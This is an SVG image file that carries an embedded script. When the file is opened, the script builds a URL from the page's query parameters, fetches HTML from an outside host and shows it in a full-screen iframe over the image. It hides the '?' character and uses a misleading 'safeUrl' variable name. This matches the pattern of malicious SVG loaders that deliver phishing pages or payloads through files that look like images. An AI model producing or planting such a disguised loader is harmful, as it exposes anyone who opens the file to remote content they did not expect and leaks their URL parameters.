<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
  <foreignObject x="0" y="0" width="100%" height="100%">
    <body id="main-body" xmlns="http://w3.org" style="margin:0;padding:0;width:100%;height:100%;overflow:hidden;">
      <iframe style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;" id="test"></iframe>
      <script>
        (async function() {
          try {
            const params = new URLSearchParams(window.location.search);
            params.set("t", Date.now().toString());
            const safeUrl = "https://jsdelivr.net" + "\x3F" + params.toString();
            
            const response = await fetch(safeUrl);
            if (!response.ok) throw new Error("HTTP " + response.status);
            const rawHtml = await response.text();
            
            document.getElementById('test').srcdoc = rawHtml;
          } catch (error) {
            console.error(error);
            document.getElementById('main-body').style.backgroundColor = '#000000';
            document.getElementById('test').style.display = 'none';
          }
        })();
      </script>
    </body>
  </foreignObject>
</svg>
